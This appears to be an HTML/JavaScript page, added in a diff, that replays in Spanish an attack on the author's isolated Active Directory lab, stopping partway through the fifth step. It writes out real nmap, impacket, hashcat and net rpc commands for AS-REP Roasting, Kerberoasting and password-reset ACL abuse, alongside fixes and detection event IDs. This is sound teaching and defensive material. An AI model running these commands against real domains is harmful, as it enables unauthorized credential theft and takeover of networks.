@@ -1,0 +1,494 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Nordwind AD Lab — replay del ataque: de cero credenciales a Domain Admin</title>
+<meta name="description" content="Reproducción animada, paso a paso, de un ataque real contra mi laboratorio de Active Directory: AS-REP Roasting, Kerberoasting, abuso de ACL, AdminSDHolder/SDProp y DCSync.">
+<meta property="og:title" content="Nordwind AD Lab — de cero credenciales a Domain Admin">
+<meta property="og:description" content="Replay animado de un ataque real contra mi laboratorio de Active Directory, con el porqué, el arreglo y la detección de cada paso.">
+<link rel="stylesheet" href="assets/lab.css">
+</head>
+<body>
+<div class="wrap">
+
+<nav class="sitenav" aria-label="Serie Nordwind AD Lab">
+  <a href="index.html">← Inicio</a>
+  <span class="sn-pos">Nordwind AD Lab · <b>1 de 3</b> · El ataque</span>
+  <a href="fundamentos.html">Siguiente: cómo funciona AD por dentro →</a>
+</nav>
+
+<header class="topbar">
+  <h1>Nordwind AD Lab — de <em>cero credenciales</em> a <em>Domain Admin</em></h1>
+  <div class="tb-sub">
+    <span class="tag">Replay de un ataque real en mi laboratorio · no es un AD en vivo</span>
+    <span class="sep">·</span>
+    <span>Dominio montado, saboteado y atacado por mí (fases: construir → sabotear → atacar). Esto reproduce la fase de ataque.</span>
+    <span class="sep">·</span>
+    <a href="https://github.com/jorgearma/nordwind-ad-lab">Repositorio</a>
+    <a href="https://github.com/jorgearma/nordwind-ad-lab/blob/main/docs/phase3-attack.md">Writeup</a>
+  </div>
+</header>
+
+<div class="stage">
+  <section class="card rel">
+    <div class="card-h stepsbar"><div class="steps" id="steps" role="tablist" aria-label="Pasos del ataque"></div></div>
+    <div class="gwrap"><svg id="g" viewBox="-75 0 895 590" role="img" aria-label="Grafo del dominio nordwind.local y del atacante"></svg></div>
+    <div class="lootbar"><span>EN MANOS DEL ATACANTE</span><div class="loot" id="loot"><em>nada todavía</em></div><span class="hint">Pulsa un elemento del grafo para saber qué es</span></div>
+    <div class="ficha" id="ficha" hidden role="dialog" aria-modal="true" aria-labelledby="f-title">
+      <div class="ficha-h">
+        <div><div class="f-type" id="f-type"></div><h2 class="f-title" id="f-title"></h2><div class="f-dn" id="f-dn"></div></div>
+        <button class="f-close" id="f-close" aria-label="Cerrar ficha" title="Cerrar (Esc)">✕</button>
+      </div>
+      <div class="f-body" id="f-body"></div>
+      <div class="f-foot">La reproducción queda en pausa mientras lees. Cierra con ✕ o <kbd>Esc</kbd>.</div>
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-h"><div class="dots"><i></i><i></i><i></i></div><span id="termtitle">kali — ~/nordwind</span><span class="sp"></span><span class="nw">salida reconstruida · hashes ocultos</span></div>
+    <div class="term" id="term">
+      <div class="start" id="start"><div><button id="startbtn">▶ Empezar por el paso 1</button><p>Avanza a tu ritmo con los pasos 1–8 de arriba o con <kbd>→</kbd> / <kbd>←</kbd>. Cada paso se queda en pantalla hasta que pulses el siguiente. Mientras una escena se escribe, <kbd>→</kbd> o volver a pulsar el paso la completa de golpe; <kbd>Espacio</kbd> pausa.</p></div></div>
+    </div>
+  </section>
+</div>
+
+<section class="card wirecard"><div class="card-h"><span>QUÉ VIAJA POR LA RED</span><span class="sp"></span><span>se acumula durante el paso</span></div><div class="wire" id="wire"></div></section>
+
+<section class="info" id="info">
+  <div class="info-h"><span class="num" id="i-num"></span><h2 id="i-title"></h2><span class="need" id="i-need"></span></div>
+  <p class="sum" id="i-sum"></p>
+  <div class="cards">
+    <div class="c why"><h3 id="c1t"></h3><p id="c1"></p></div>
+    <div class="c fix"><h3 id="c2t"></h3><p id="c2"></p></div>
+    <div class="c det"><h3 id="c3t"></h3><p id="c3"></p></div>
+  </div>
+</section>
+
+<p class="serie"><b>Orden de lectura:</b> <span class="here">1 · el ataque (estás aquí)</span> → <a href="fundamentos.html">2 · cómo funciona AD</a> → <a href="diagrams/ad-explorer.html">3 · el explorador</a>. Si prefieres aprender antes de ver cómo se rompe, léelo al revés.</p>
+
+<footer>
+  <span>Jorge Escobar · laboratorio propio y aislado (VirtualBox, red interna). Windows Server 2022 + Windows 11.</span>
+  <span>La base del dominio es de <a href="https://github.com/maciej-stawowy/active-directory-lab">Maciej Stawowy</a> (MIT); el sabotaje y el ataque son míos.</span>
+</footer>
+<noscript><p>Esta página necesita JavaScript para reproducir la animación. El writeup completo está en el repositorio.</p></noscript>
+</div>
+
+<script src="assets/engine.js"></script>
+<script>
+"use strict";
+/* ============================================================
+   DATOS DEL DOMINIO (posiciones en el viewBox 820x590)
+   ============================================================ */
+const NODES = {
+  kali:  {x:45,  y:100, kind:'atk',   label:'Kali',             sub:'192.168.10.50'},
+  dc:    {x:480, y:100, kind:'pc',    label:'DC01',             sub:'192.168.10.10'},
+  cl:    {x:720, y:100, kind:'pc',    label:'CL01',             sub:'Windows 11'},
+  piotr: {x:295, y:245, kind:'user',  label:'piotr.wisniewski', sub:'IT Manager'},
+  svc:   {x:685, y:245, kind:'user',  label:'svc_sql',          sub:'cuenta de servicio'},
+  robert:{x:295, y:415, kind:'user',  label:'robert.dabrowski', sub:'Warehouse Foreman'},
+  da:    {x:495, y:415, kind:'group', label:'Domain Admins',    sub:'grupo'},
+  admin: {x:610, y:415, kind:'user',  label:'Administrator',    sub:'RID 500'},
+  krbtgt:{x:720, y:415, kind:'user',  label:'krbtgt',           sub:'RID 502'}
+};
+const OUS = [
+  {x:200,y:185,w:190,h:125,label:'OU=IT',k:'ou_it'},
+  {x:590,y:185,w:190,h:125,label:'OU=ServiceAccounts',k:'ou_svc'},
+  {x:200,y:355,w:190,h:125,label:'OU=Warehouse',k:'ou_wh'},
+  {x:430,y:355,w:350,h:125,label:'CN=Users',k:'cn_users'}
+];
+const OTHERS = ['jan.kowalski','anna.nowak','katarzyna.wojcik','tomasz.kowalczyk','magdalena.kaminska','marek.lewandowski','agnieszka.zielinska','pawel.szymanski'];
+const HID = '████████████████';
+
+/* ============================================================
+   FICHAS — qué es cada pieza del dominio (se abre al pulsarla).
+   Objetivo: que alguien que nunca ha tocado un AD entienda
+   cómo está dispuesto y por qué, no solo qué se ataca.
+   ============================================================ */
+const INFO = {
+  dom:{type:'Dominio', title:'nordwind.local', dn:'DC=nordwind,DC=local', secs:[
+    ['Qué es','Un dominio es un grupo de equipos y usuarios que comparten una única base de datos de identidades (el directorio) y unas mismas reglas. Todo lo que ves dentro de la línea discontinua son objetos guardados en esa base de datos: usuarios, equipos, grupos y carpetas (OU).'],
+    ['Por qué existe','Sin dominio, cada ordenador tiene sus propios usuarios y contraseñas locales. Con 5 equipos se aguanta; con 500 es inmanejable. Con un dominio, una persona tiene una sola cuenta válida en cualquier equipo, y la empresa da de alta, da de baja y aplica políticas desde un único sitio.'],
+    ['Cómo se organiza','Como un árbol. Arriba el dominio; debajo, contenedores y unidades organizativas (OU); dentro, los objetos. Cada objeto tiene una ruta única, su `DN`, por ejemplo `CN=svc_sql,OU=ServiceAccounts,OU=Nordwind,DC=nordwind,DC=local`. Leído de derecha a izquierda es como una dirección postal.'],
+    ['Lo que se suele malentender','Que centralizar la gestión también centraliza el riesgo: lo mismo que hace cómoda la administración hace que un solo fallo de configuración pueda terminar dando acceso a todo. Ese es justo el hilo de este ataque.']]},
+
+  dc:{type:'Equipo · controlador de dominio', title:'DC01', dn:'Windows Server 2022 · 192.168.10.10', secs:[
+    ['Qué es','El servidor que guarda el directorio y responde a todas las preguntas sobre él. Cada vez que alguien inicia sesión en cualquier equipo del dominio, es el DC quien comprueba que conoce su contraseña (la contraseña no viaja: se demuestra con Kerberos). Si se apaga, nadie obtiene tickets nuevos: solo se puede entrar en equipos donde ya se había iniciado sesión antes, con credenciales en caché, y sin acceso a los recursos del dominio.'],
+    ['Qué servicios da','`88` Kerberos: comprueba identidades y emite tickets (al DC en este papel se le llama KDC). `389` LDAP: consulta y modifica el directorio. `53` DNS: los equipos lo usan para localizar al propio DC. `445` SMB: comparte SYSVOL, donde están las políticas y scripts que descargan los clientes. En este lab también reparte IPs (DHCP).'],
+    ['Dónde guarda todo','En un fichero, `C:\\Windows\\NTDS\\ntds.dit`. Contiene todos los objetos del dominio y también los hashes de las contraseñas de todas las cuentas. Por eso es el objetivo final.'],
+    ['En una empresa real','Hay al menos dos DC que se copian los cambios entre sí (replicación), para que el dominio siga vivo si uno cae. Ese mecanismo legítimo de copia es exactamente lo que se abusa en el paso 7 (DCSync).']]},
+
+  cl:{type:'Equipo · cliente del dominio', title:'CL01', dn:'Windows 11 Enterprise · unido a nordwind.local', secs:[
+    ['Qué es','El ordenador de un empleado. Está unido al dominio: confía en DC01 para decidir quién puede iniciar sesión en él.'],
+    ['Qué significa "estar unido"','El equipo tiene su propia cuenta en el directorio (`CL01$`), con una contraseña que él mismo cambia cada 30 días sin que nadie la vea. Con ella se autentica contra el DC al arrancar, descarga las políticas que le tocan y, cuando un usuario escribe su contraseña, la usa para pedirle un ticket al DC en su nombre.'],
+    ['Por qué cualquier empleado puede usarlo','Porque la cuenta del usuario no vive en el PC, vive en el directorio. piotr puede iniciar sesión en CL01 o en cualquier otro equipo del dominio con la misma contraseña.'],
+    ['En este ataque','No hizo falta tocarlo. En un caso real sería la puerta de entrada típica (phishing a un empleado) y un sitio donde quedan credenciales en memoria; aquí bastó con hablar directamente con el DC desde Kali.']]},
+
+  kali:{type:'Equipo · atacante', title:'Kali', dn:'192.168.10.50 · fuera del dominio', secs:[
+    ['Qué es','La máquina del atacante. No pertenece al dominio y empieza sin ninguna credencial. Está en la misma red que el lab, nada más.'],
+    ['Por qué puede hacer daño sin ser del dominio','Porque los servicios del DC (Kerberos, LDAP) atienden peticiones por la red. Algunas, por diseño o por mala configuración, responden a cualquiera que pregunte. Todo este ataque consiste en hacerle al DC las preguntas correctas desde fuera.'],
+    ['Qué herramientas usa','`impacket` (habla Kerberos y SMB desde Linux), `netexec` (prueba credenciales), `hashcat` (crackea hashes offline, en esta máquina, sin que el DC se entere) y `bloodhound-python` (dibuja el mapa de permisos del dominio).']]},
+
+  piotr:{type:'Usuario · cuenta de persona', title:'piotr.wisniewski', dn:'CN=piotr.wisniewski,OU=IT,OU=Users,OU=Nordwind,…', secs:[
+    ['Qué es','La cuenta de un empleado real, Piotr, IT Manager. Vive en la OU del departamento de IT. Es una cuenta normal, sin privilegios de administración.'],
+    ['Qué puede hacer cualquier usuario así','Más de lo que parece. Cualquier cuenta válida del dominio puede leer casi todo el directorio por LDAP (quién existe, a qué grupos pertenece, qué permisos hay). Esa lectura es legítima y es la que alimenta a BloodHound.'],
+    ['Por qué es la primera pieza que cae','Tiene dos fallos plantados: la pre-autenticación de Kerberos desactivada (lo hace crackeable sin credenciales, paso 2) y un permiso sobre otra cuenta que abre una ruta de escalada (paso 4).']]},
+
+  svc:{type:'Usuario · cuenta de servicio', title:'svc_sql', dn:'CN=svc_sql,OU=ServiceAccounts,OU=Nordwind,…', secs:[
+    ['Qué es','No es una persona: es la identidad con la que se ejecuta un servicio, aquí un SQL Server. Los servicios necesitan una cuenta para autenticarse ante el resto del dominio igual que un usuario.'],
+    ['Qué es un SPN','Un Service Principal Name es la etiqueta que dice "este servicio (MSSQL en dc01:1433) lo atiende esta cuenta". Kerberos lo usa para saber con qué clave cifrar el ticket de ese servicio. El SPN en sí es necesario y correcto.'],
+    ['Por qué es peligrosa','Cualquier usuario del dominio puede pedir un ticket para su SPN, y ese ticket va cifrado con la contraseña de la cuenta. Si la contraseña es débil y elegida por una persona (`Summer2023!`), se crackea offline. Por eso las cuentas de servicio deberían usar contraseñas gestionadas (gMSA). Es el paso 3, Kerberoasting.']]},
+
+  robert:{type:'Usuario · cuenta de persona', title:'robert.dabrowski', dn:'CN=robert.dabrowski,OU=Warehouse,OU=Users,…', secs:[
+    ['Qué es','Otro empleado normal, encargado de almacén, en la OU de Warehouse. Por sí mismo no tiene nada especial.'],
+    ['Por qué importa','Es el escalón intermedio de la ruta de escalada. piotr tiene permiso para cambiarle la contraseña (sin saber la antigua), y a su vez robert tiene —por un permiso mal puesto— control sobre el grupo Domain Admins. Nadie debería poder encadenar eso.'],
+    ['La lección de fondo','En AD un permiso puede ser poder sobre otro objeto, no solo acceso a un recurso. Esos permisos, encadenados, forman rutas invisibles hasta que una herramienta como BloodHound las dibuja.']]},
+
+  da:{type:'Grupo · grupo protegido', title:'Domain Admins', dn:'CN=Domain Admins,CN=Users,DC=nordwind,DC=local', secs:[
+    ['Qué es','El grupo más poderoso del dominio. Sus miembros son administradores de todo: cualquier equipo, cualquier cuenta, el propio DC. Entrar aquí es, a efectos prácticos, ser dueño del dominio.'],
+    ['Qué es un grupo (y en qué se diferencia de una OU)','Un grupo junta cuentas para darles acceso o poder en bloque. Una OU es una carpeta para organizar y aplicar políticas. Un usuario está en una OU (dónde vive) y en varios grupos (qué puede hacer). Confundirlos es el error clásico al empezar.'],
+    ['Cómo se defiende solo','Es un grupo protegido: un proceso del DC llamado SDProp reescribe su lista de permisos desde una plantilla (AdminSDHolder) cada ~60 minutos. Si alguien le mete un permiso indebido, se borra solo. Eso es lo que hace fallar el paso 5 y obliga a "ganar la carrera" en el paso 6.']]},
+
+  admin:{type:'Usuario · cuenta integrada', title:'Administrator', dn:'CN=Administrator,CN=Users · RID 500', secs:[
+    ['Qué es','La cuenta de administrador que se crea con el dominio. Su RID (el número final de su identificador) siempre es `500`, así que un atacante la reconoce aunque la renombren.'],
+    ['Por qué su hash es un trofeo','Con el hash NT de su contraseña se puede autenticar sin conocer la contraseña en claro (Pass-the-Hash) contra cualquier máquina donde esa cuenta tenga acceso. Se obtiene en el DCSync del paso 7.']]},
+
+  krbtgt:{type:'Usuario · cuenta especial de Kerberos', title:'krbtgt', dn:'CN=krbtgt,CN=Users · RID 502', secs:[
+    ['Qué es','La cuenta más silenciosa y más crítica del dominio. Nadie inicia sesión con ella. Su única función: de su contraseña sale la clave con la que el KDC cifra y firma todos los TGT del dominio (los tickets de servicio van cifrados con la clave de cada servicio).'],
+    ['Por qué es el final del camino','Quien tiene el hash de krbtgt puede fabricarse tickets válidos para cualquier usuario, incluido un administrador inventado (un Golden Ticket). Es persistencia total: aunque cambien contraseñas, los tickets forjados siguen valiendo hasta que se rota krbtgt dos veces. Por eso el ataque termina aquí, en el paso 7.']]},
+
+  ou_it:{type:'Unidad organizativa (OU)', title:'OU=IT', dn:'OU=IT,OU=Users,OU=Nordwind,…', secs:[
+    ['Qué es','La carpeta del departamento de IT dentro del directorio. Aquí vive la cuenta de piotr. En este lab cada departamento (IT, Ventas, Almacén, RRHH…) tiene su propia OU bajo `OU=Users`.'],
+    ['Para qué sirve una OU','Para dos cosas: aplicar políticas (GPO) a todo lo que contiene y delegar su administración (por ejemplo, que Help Desk pueda cambiar contraseñas solo en esta OU). Una OU NO da acceso a recursos: para eso están los grupos.']]},
+
+  ou_svc:{type:'Unidad organizativa (OU)', title:'OU=ServiceAccounts', dn:'OU=ServiceAccounts,OU=Nordwind,…', secs:[
+    ['Qué es','La carpeta donde se agrupan las cuentas de servicio, separadas de las personas. Aquí vive svc_sql.'],
+    ['Por qué se separan','Para tratarlas distinto: aplicarles políticas más estrictas, vigilarlas aparte y poder decir "ninguna cuenta de esta OU debería usarse nunca para iniciar sesión interactiva". Tenerlas juntas facilita auditar que todas usan contraseñas gestionadas (gMSA), justo lo que aquí falla.']]},
+
+  ou_wh:{type:'Unidad organizativa (OU)', title:'OU=Warehouse', dn:'OU=Warehouse,OU=Users,OU=Nordwind,…', secs:[
+    ['Qué es','La carpeta del departamento de almacén. Aquí vive robert. Igual que OU=IT, es organización y políticas, no permisos.'],
+    ['Detalle útil','Que robert esté en la OU de Almacén no le da ningún poder especial: su peligro no viene de dónde vive, sino de un permiso suelto que alguien le concedió sobre el grupo Domain Admins. OU ≠ privilegios.']]},
+
+  cn_users:{type:'Contenedor integrado', title:'CN=Users', dn:'CN=Users,DC=nordwind,DC=local', secs:[
+    ['Qué es','Un contenedor que viene de serie con el dominio. Aquí están las cuentas y grupos que crea Windows automáticamente: Administrator, krbtgt y grupos como Domain Admins.'],
+    ['En qué se diferencia de una OU','Un contenedor (`CN=`) se parece a una OU pero no se le pueden aplicar políticas (GPO) directamente. Por eso las empresas crean sus propias OU (como `OU=Nordwind`) y mueven ahí a sus usuarios, dejando `CN=Users` para lo que pone el sistema.']]},
+
+  others:{type:'Usuarios · resto de la plantilla', title:'Los otros 8 empleados', dn:'repartidos por las OU de cada departamento', secs:[
+    ['Qué son','El resto de personas de Nordwind (dirección, ventas, contabilidad, RRHH…). Cuentas normales, sin fallos plantados.'],
+    ['Por qué aparecen en gris','Para mostrar algo clave del paso 2: el ataque AS-REP se lanza contra toda la lista, pero solo cae la cuenta mal configurada (piotr). Estas 8 responden "exijo pre-autenticación" y no sueltan nada. Son el "ruido" normal del que el atacante tiene que separar la pieza vulnerable.']]}
+};
+
+/* ============================================================
+   LAS ESCENAS
+   Cada acción: cmd / out / cm (comentario) / pkt / beam / wire / set / wait
+   Las acciones "set" son las únicas que cambian el estado del grafo,
+   así que saltar a un paso = volver a aplicar los "set" anteriores.
+   ============================================================ */
+const STEPS = [
+{
+  chip:'Recon', title:'Reconocimiento: ¿qué es esta máquina?', need:'Sin credenciales',
+  sum:'Kali está en la misma red que el dominio y no sabe nada todavía. Un escaneo de siete puertos basta para identificar al controlador de dominio.',
+  cards:[
+    ['Por qué funciona','Un DC no puede esconderse: Kerberos (`88`), LDAP (`389`/`636`) y Global Catalog (`3268`) tienen que estar abiertos para que los equipos del dominio funcionen. Esa combinación de puertos es su huella.'],
+    ['Cómo se arregla','No se arregla cerrando puertos, sino limitando quién llega a ellos: segmentación de red para que solo las redes de clientes y servidores alcancen al DC, y nunca una máquina desconocida.'],
+    ['Cómo se detecta','Un barrido de puertos contra el DC desde una IP que no pertenece a ningún equipo del dominio. Se ve en el firewall o el IDS de red, no en el registro de seguridad de Windows.']
+  ],
+  script:[
+    {t:'cmd', s:'nmap -Pn -p 53,88,135,389,445,636,3268 192.168.10.10'},
+    {t:'wire', title:'TCP · Kali → DC01 · escaneo de puertos', parts:[['SYN → 7 puertos','Kali toca cada puerto y espera respuesta. Sin credenciales, sin cifrado.'],['88 · 389 · 3268 → SYN/ACK','abiertos: Kerberos + LDAP + Global Catalog','warn'],['53 · 445 · 636 → SYN/ACK','abiertos también: DNS, SMB y LDAPS'],['sin respuesta o RST','puerto filtrado o cerrado']], note:'Aquí no viaja nada cifrado: es TCP puro. La huella (88 + 389 + 3268 abiertos a la vez) es lo que delata a un controlador de dominio; ningún otro servidor abre esa combinación.'},
+    {t:'pkt', from:'kali', to:'dc', label:'SYN → 7 puertos', cls:'req'},
+    {t:'pkt', from:'dc', to:'kali', label:'SYN/ACK', cls:'no'},
+    {t:'out', lines:['53/tcp   open  domain',['hl','88/tcp   open  kerberos-sec      ← Kerberos'],'389/tcp  open  ldap','445/tcp  open  microsoft-ds','636/tcp  open  ldapssl',['hl','3268/tcp open  globalcatLDAP     ← Global Catalog']]},
+    {t:'set', f:G=>{G.sub('dc','KDC :88 · LDAP :389 · SMB :445');G.add('dc','target');}},
+    {t:'cm', s:'# 88 + 389 + 3268 abiertos: es un Domain Controller.'},
+    {t:'cmd', s:'echo "192.168.10.10 dc01.nordwind.local nordwind.local dc01" | sudo tee -a /etc/hosts'},
+    {t:'cm', s:'# Kerberos liga los tickets al nombre del servicio, no a la IP. Sin resolver el FQDN, los ataques Kerberos fallan.'},
+    {t:'set', f:G=>G.rm('dc','target')}
+  ]
+},
+{
+  chip:'AS-REP', title:'AS-REP Roasting: la primera credencial', need:'Solo una lista de usuarios',
+  sum:'Kali pide un TGT para cada usuario de una lista, sin contraseña. Nueve cuentas responden que exigen pre-autenticación. Una no: la de piotr. El DC le entrega material cifrado con su contraseña, que se crackea offline.',
+  cards:[
+    ['Por qué funciona','La pre-autenticación obliga a demostrar que conoces la contraseña (cifrando un timestamp con ella) antes de recibir el AS-REP. Con `DONT_REQ_PREAUTH` activado, el KDC responde a cualquiera que nombre la cuenta, y parte de esa respuesta va cifrada con la clave del usuario. Si la contraseña es débil, cae.'],
+    ['Cómo se arregla','No desactivar la pre-autenticación salvo que una aplicación antigua lo exija y esté documentado. Si no hay remedio, contraseña larga y aleatoria en esa cuenta. Auditar periódicamente qué cuentas llevan el flag (BloodHound las marca).'],
+    ['Cómo se detecta','Event ID `4768` con Pre-Authentication Type `0` y cifrado `0x17` (RC4). Una ráfaga de peticiones de TGT desde la misma IP para muchos usuarios distintos es la firma. El crackeo ocurre en la máquina del atacante: eso no se ve.']
+  ],
+  script:[
+    {t:'cmd', s:'impacket-GetNPUsers nordwind.local/ -usersfile users.txt -no-pass -dc-ip 192.168.10.10 -format hashcat -outputfile asrep.txt'},
+    {t:'wire', title:'AS-REQ · Kali → KDC (puerto 88)', parts:[['cname','el usuario de la lista'],['sname','krbtgt/NORDWIND.LOCAL'],['padata','vacío: sin timestamp cifrado','warn']], note:'Kali pide un TGT nombrando al usuario, sin demostrar que conoce su contraseña.'},
+    {t:'set', f:G=>G.others('ask')},
+    {t:'pkt', from:'kali', to:'dc', label:'AS-REQ × 10 sin pre-auth', cls:'req'},
+    {t:'pkt', from:'dc', to:'kali', label:'PREAUTH_REQUIRED × 9', cls:'no'},
+    {t:'set', f:G=>G.others('safe')},
+    {t:'out', lines:["[-] User jan.kowalski doesn't have UF_DONT_REQUIRE_PREAUTH set","[-] User anna.nowak doesn't have UF_DONT_REQUIRE_PREAUTH set",['dim','    … y 7 usuarios más, misma respuesta']]},
+    {t:'set', f:G=>{G.add('piotr','target');G.sub('piotr','DONT_REQ_PREAUTH');}},
+    {t:'beam', from:'dc', to:'piotr', color:'var(--amber)'},
+    {t:'wire', title:'AS-REP · KDC → Kali', parts:[['ticket (TGT)','cifrado con la clave de krbtgt'],['enc-part','cifrado con la clave de piotr → crackeable offline','bad']], note:'Con RC4 (etype 23) la clave de piotr es directamente el hash NT de su contraseña. Hashcat prueba candidatas hasta que una descifra el bloque.'},
+    {t:'pkt', from:'dc', to:'kali', label:'AS-REP de piotr', cls:'hit'},
+    {t:'out', lines:[['hl','$krb5asrep$23$piotr.wisniewski@NORDWIND.LOCAL:'+HID+'…']]},
+    {t:'cmd', s:'hashcat -m 18200 asrep.txt seasons.txt --force'},
+    {t:'cm', s:'# --force: la VM no tiene GPU y hashcat usa la CPU. En un equipo de verdad, GPU y sin --force.'},
+    {t:'wait', ms:700},
+    {t:'out', lines:[['pw','$krb5asrep$23$piotr.wisniewski@NORDWIND.LOCAL:…:Autumn2024!'],'Status...........: Cracked','Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)']},
+    {t:'cm', s:'# Autumn2024! no está en rockyou.txt. La saqué con una wordlist propia del patrón estación + año + símbolo.'},
+    {t:'cmd', s:"netexec smb 192.168.10.10 -u piotr.wisniewski -p 'Autumn2024!'"},
+    {t:'out', lines:[['ok','SMB  192.168.10.10  445  DC01  [+] nordwind.local\\piotr.wisniewski:Autumn2024!']]},
+    {t:'set', f:G=>{G.rm('piotr','target');G.add('piotr','owned');G.sub('piotr','comprometido');G.others('');G.loot('piotr');}}
+  ]
+},
+{
+  chip:'Kerberoast', title:'Kerberoasting: una cuenta de servicio', need:'Como piotr (usuario sin privilegios)',
+  sum:'Con un usuario cualquiera del dominio ya se puede preguntar por LDAP qué cuentas tienen un SPN y pedir un ticket de servicio para cada una. Ese ticket va cifrado con la contraseña de la cuenta de servicio.',
+  cards:[
+    ['Por qué funciona','Cualquier usuario autenticado puede pedir un ticket para cualquier SPN: el KDC no comprueba si tiene permiso sobre el servicio. El ticket va cifrado con la clave de la cuenta dueña del SPN. El SPN es legítimo; el fallo es la contraseña débil y elegida por una persona (`Summer2023!`).'],
+    ['Cómo se arregla','gMSA (Group Managed Service Accounts): Windows genera y rota una contraseña aleatoria de 240 bytes (120 caracteres). Si no es posible, contraseña aleatoria de 25+ caracteres y forzar AES en lugar de RC4.'],
+    ['Cómo se detecta','Event ID `4769` con cifrado `0x17` (RC4), sobre todo en ráfaga o pedido por un usuario que nunca usa ese servicio. Una cuenta señuelo con un SPN falso que nadie debería pedir da una alerta sin falsos positivos.']
+  ],
+  script:[
+    {t:'cmd', s:"impacket-GetUserSPNs nordwind.local/piotr.wisniewski:'Autumn2024!' -dc-ip 192.168.10.10 -request -outputfile kerb.txt"},
+    {t:'pkt', from:'kali', to:'dc', label:'LDAP: (servicePrincipalName=*)', cls:'req'},
+    {t:'beam', from:'dc', to:'svc', color:'var(--amber)'},
+    {t:'set', f:G=>{G.add('svc','target');G.sub('svc','SPN MSSQLSvc/…:1433');}},
+    {t:'out', lines:['ServicePrincipalName                Name     MemberOf','----------------------------------  -------  --------',['hl','MSSQLSvc/dc01.nordwind.local:1433   svc_sql']]},
+    {t:'wire', title:'TGS-REQ · Kali → KDC', parts:[['TGT','el de piotr, obtenido con su contraseña'],['sname','MSSQLSvc/dc01.nordwind.local:1433','warn']], note:'El KDC entrega el ticket sin comprobar si piotr tiene algún derecho sobre el servicio SQL.'},
+    {t:'pkt', from:'kali', to:'dc', label:'TGS-REQ MSSQLSvc', cls:'req'},
+    {t:'wire', title:'TGS-REP · KDC → Kali', parts:[['ticket de servicio','cifrado con la clave de svc_sql → crackeable offline','bad'],['enc-part','cifrado con la clave de sesión de piotr']], note:'Mismo principio que antes, distinto ticket: modo 13100 de hashcat en lugar de 18200.'},
+    {t:'pkt', from:'dc', to:'kali', label:'TGS-REP de svc_sql', cls:'hit'},
+    {t:'out', lines:[['hl','$krb5tgs$23$*svc_sql$NORDWIND.LOCAL$nordwind.local/svc_sql*$'+HID+'…']]},
+    {t:'cmd', s:'hashcat -m 13100 kerb.txt seasons.txt --force'},
+    {t:'wait', ms:700},
+    {t:'out', lines:[['pw','$krb5tgs$23$*svc_sql$NORDWIND.LOCAL$…:Summer2023!'],'Status...........: Cracked']},
+    {t:'set', f:G=>{G.rm('svc','target');G.add('svc','owned');G.sub('svc','comprometida');G.loot('svc_sql');}},
+    {t:'cm', s:'# En este lab svc_sql no lleva más lejos: es una segunda puerta de entrada. En un entorno real las cuentas de servicio suelen tener privilegios de sobra.'}
+  ]
+},
+{
+  chip:'ACL', title:'Abuso de ACL, salto 1: piotr se convierte en robert', need:'Como piotr',
+  sum:'En AD un permiso puede ser poder sobre otro objeto. piotr tiene el derecho de restablecer la contraseña de robert sin conocer la anterior. Lo usa, y pasa a controlar esa cuenta.',
+  cards:[
+    ['Por qué funciona','La ACL de la cuenta de robert concede a piotr el derecho extendido Reset Password (`ForceChangePassword` en BloodHound). Quien controla una cuenta hereda todo lo que esa cuenta puede hacer. Estos permisos aparecen por delegaciones apresuradas y concesiones "temporales" olvidadas.'],
+    ['Cómo se arregla','Revisar las delegaciones con regularidad (BloodHound también sirve para defender). Restablecer contraseñas es función de Help Desk, delegada por OU a un grupo concreto, nunca de un usuario sobre otro.'],
+    ['Cómo se detecta','Event ID `4724` (intento de restablecer la contraseña de una cuenta) donde quien lo hace no es Help Desk. Suele ir seguido de un inicio de sesión (`4624`) de la víctima desde una IP en la que nunca había entrado.']
+  ],
+  script:[
+    {t:'set', f:G=>{G.edge('fcp','piotr','robert','ForceChangePassword','');G.add('robert','target');}},
+    {t:'cm', s:'# piotr tiene el derecho Reset Password sobre robert (lo planté en la fase de sabotaje).'},
+    {t:'cmd', s:"net rpc password robert.dabrowski 'NewPass123!' -U 'nordwind.local/piotr.wisniewski%Autumn2024!' -S 192.168.10.10"},
+    {t:'wire', title:'MS-SAMR · Kali → DC01 · autenticado como piotr', parts:[['SamrOpenUser','abre la cuenta de robert en el directorio'],['SamrSetInformationUser','escribe una contraseña nueva, sin pedir la antigua','bad']], note:'El derecho ForceChangePassword permite fijar la contraseña sin conocer la anterior. Viaja dentro de una sesión SMB autenticada como piotr (tubería \\\\PIPE\\\\samr); aquí no hay Kerberos de por medio.'},
+    {t:'pkt', from:'kali', to:'dc', label:'SAMR: nueva contraseña', cls:'hit'},
+    {t:'beam', from:'piotr', to:'robert', color:'var(--red)'},
+    {t:'cmd', s:"netexec smb 192.168.10.10 -u robert.dabrowski -p 'NewPass123!'"},
+    {t:'out', lines:[['ok','SMB  192.168.10.10  445  DC01  [+] nordwind.local\\robert.dabrowski:NewPass123!']]},
+    {t:'set', f:G=>{G.edge('fcp','piotr','robert','ForceChangePassword','red');G.rm('robert','target');G.add('robert','owned');G.sub('robert','comprometido');G.loot('robert');}}
+  ]
+},
+{
+  chip:'SDProp', title:'Abuso de ACL, salto 2: el dominio se defiende', need:'Como robert',
+  sum:'robert debería tener control total sobre el grupo Domain Admins y poder añadirse. El comando devuelve ACCESS_DENIED. No era un error mío: era una defensa de AD actuando en ese momento.',
+  cards:[
+    ['Por qué falló','Domain Admins es un grupo protegido. El proceso SDProp se ejecuta en el DC cada 60 minutos aproximadamente y copia la ACL de la plantilla `AdminSDHolder` sobre los grupos protegidos y sus miembros. El `GenericAll` que planté en la fase de sabotaje ya había sido borrado.'],
+    ['Qué enseña','Un ACCESS_DENIED no siempre es un comando mal escrito: leer el error en contexto vale más que reintentar a ciegas. Una ACL puesta directamente sobre un objeto protegido caduca sola en menos de una hora.'],
+    ['Cómo se detecta','Event ID `4780`: SDProp deja constancia de que ha reescrito la ACL de una cuenta o grupo administrativo. Si aparece, es que alguien la había modificado antes. El cambio original deja un `5136` si se auditan los cambios del directorio.']
+  ],
+  script:[
+    {t:'set', f:G=>{G.edge('ga','robert','da','GenericAll','');G.add('da','target');}},
+    {t:'cmd', s:"net rpc group addmem \"Domain Admins\" robert.dabrowski -U 'nordwind.local/robert.dabrowski%NewPass123!' -S 192.168.10.10"},
